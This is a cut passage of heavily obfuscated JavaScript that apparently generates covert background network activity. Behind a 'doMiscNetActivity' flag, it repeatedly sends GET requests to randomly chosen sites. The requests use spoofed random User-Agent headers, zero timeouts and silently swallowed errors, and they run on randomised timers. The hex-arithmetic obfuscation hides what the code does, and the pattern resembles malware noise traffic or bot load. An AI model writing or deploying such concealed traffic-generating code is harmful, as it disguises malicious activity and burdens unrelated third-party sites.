    for (let l = 0x1d * 0x6c + 0x76 * 0x52 + -0x3208; l < -0x251e * 0x1 + -0x1e2 + 0x1 * 0x2704; l++)
      setTimeout(f, (-0x2b3a + 0x7de2 + 0x97b8) * l * getRandomInt(0x9bc + -0x22a5 + 0x18ea, 0xb93 + -0xac1 * -0x1 + 0xc5 * -0x1d));
  }, -0x1 * -0x426d05 + -0x20b482 * -0x2 + 0xd * -0x5ea6d);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const a4 = c,
    f = axios['create']({
      'headers': {
        'User-Agent': userAgents['random']()
      }
    });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })[a4(0x16)](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x2398 * -0x1 + 0x307 + -0xb47) * getRandomInt(-0x4be + -0xbe6 * -0x1 + -0x727, -0x1b2 * -0x11 + -0x1b0 + -0x1b1d));
}, -0x4 * 0x3e0 + 0x5b4 + 0x8 * 0x146);